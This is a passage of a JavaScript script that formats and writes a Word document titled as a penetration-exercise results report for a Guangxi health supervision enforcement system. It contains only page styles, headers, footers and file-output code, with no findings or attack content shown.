        paragraph: { spacing: { before: 360, after: 200 }, outlineLevel: 0 } },
      { id: "Heading2", name: "Heading 2", basedOn: "Normal", next: "Normal", quickFormat: true,
        run: { size: 28, bold: true, font: "Arial", color: "2B579A" },
        paragraph: { spacing: { before: 280, after: 160 }, outlineLevel: 1 } },
      { id: "Heading3", name: "Heading 3", basedOn: "Normal", next: "Normal", quickFormat: true,
        run: { size: 24, bold: true, font: "Arial", color: "333333" },
        paragraph: { spacing: { before: 200, after: 120 }, outlineLevel: 2 } },
    ]
  },
  numbering: {
    config: [
      { reference: "bullets",
        levels: [{ level: 0, format: LevelFormat.BULLET, text: "•", alignment: AlignmentType.LEFT,
          style: { paragraph: { indent: { left: 720, hanging: 360 } } } }] },
    ]
  },
  sections: [
    {
      properties: {
        page: {
          size: { width: 12240, height: 15840 },
          margin: { top: 1200, right: 1440, bottom: 1200, left: 1440 }
        }
      },
      headers: {
        default: new Header({ children: [new Paragraph({
          alignment: AlignmentType.RIGHT,
          children: [new TextRun({ text: "广西卫生监督执法系统 攻防演习成果报告", font: "Arial", size: 16, color: "999999" })]
        })] })
      },
      footers: {
        default: new Footer({ children: [new Paragraph({
          alignment: AlignmentType.CENTER,
          children: [new TextRun({ text: "第 ", font: "Arial", size: 16 }), new TextRun({ children: [PageNumber.CURRENT], font: "Arial", size: 16 })]
        })] })
      },
      children: coverSection.children
    },
    {
      properties: {
        page: {
          size: { width: 12240, height: 15840 },
          margin: { top: 1200, right: 1440, bottom: 1200, left: 1440 }
        }
      },
      headers: {
        default: new Header({ children: [new Paragraph({
          alignment: AlignmentType.RIGHT,
          children: [new TextRun({ text: "广西卫生监督执法系统 攻防演习成果报告", font: "Arial", size: 16, color: "999999" })]
        })] })
      },
      footers: {
        default: new Footer({ children: [new Paragraph({
          alignment: AlignmentType.CENTER,
          children: [new TextRun({ text: "第 ", font: "Arial", size: 16 }), new TextRun({ children: [PageNumber.CURRENT], font: "Arial", size: 16 })]
        })] })
      },
      children: overviewChildren
    },
    {
      properties: {
        page: {
          size: { width: 12240, height: 15840 },
          margin: { top: 1200, right: 1440, bottom: 1200, left: 1440 }
        }
      },
      headers: {
        default: new Header({ children: [new Paragraph({
          alignment: AlignmentType.RIGHT,
          children: [new TextRun({ text: "广西卫生监督执法系统 攻防演习成果报告", font: "Arial", size: 16, color: "999999" })]
        })] })
      },
      footers: {
        default: new Footer({ children: [new Paragraph({
          alignment: AlignmentType.CENTER,
          children: [new TextRun({ text: "第 ", font: "Arial", size: 16 }), new TextRun({ children: [PageNumber.CURRENT], font: "Arial", size: 16 })]
        })] })
      },
      children: findingsChildren
    },
    {
      properties: {
        page: {
          size: { width: 12240, height: 15840 },
          margin: { top: 1200, right: 1440, bottom: 1200, left: 1440 }
        }
      },
      headers: {
        default: new Header({ children: [new Paragraph({
          alignment: AlignmentType.RIGHT,
          children: [new TextRun({ text: "广西卫生监督执法系统 攻防演习成果报告", font: "Arial", size: 16, color: "999999" })]
        })] })
      },
      footers: {
        default: new Footer({ children: [new Paragraph({
          alignment: AlignmentType.CENTER,
          children: [new TextRun({ text: "第 ", font: "Arial", size: 16 }), new TextRun({ children: [PageNumber.CURRENT], font: "Arial", size: 16 })]
        })] })
      },
      children: problemsChildren
    },
    {
      properties: {
        page: {
          size: { width: 12240, height: 15840 },
          margin: { top: 1200, right: 1440, bottom: 1200, left: 1440 }
        }
      },
      headers: {
        default: new Header({ children: [new Paragraph({
          alignment: AlignmentType.RIGHT,
          children: [new TextRun({ text: "广西卫生监督执法系统 攻防演习成果报告", font: "Arial", size: 16, color: "999999" })]
        })] })
      },
      footers: {
        default: new Footer({ children: [new Paragraph({
          alignment: AlignmentType.CENTER,
          children: [new TextRun({ text: "第 ", font: "Arial", size: 16 }), new TextRun({ children: [PageNumber.CURRENT], font: "Arial", size: 16 })]
        })] })
      },
      children: recChildren
    }
  ]
});

const outPath = "D:/Desktop/claude projects/attack and defend test/广西卫生监督执法系统_攻防成果报告.docx";
Packer.toBuffer(doc).then(buffer => {
  fs.writeFileSync(outPath, buffer);
  console.log("Report generated: " + outPath);
  console.log("Size: " + buffer.length + " bytes");
}).catch(err => {
  console.error("Error:", err);
});
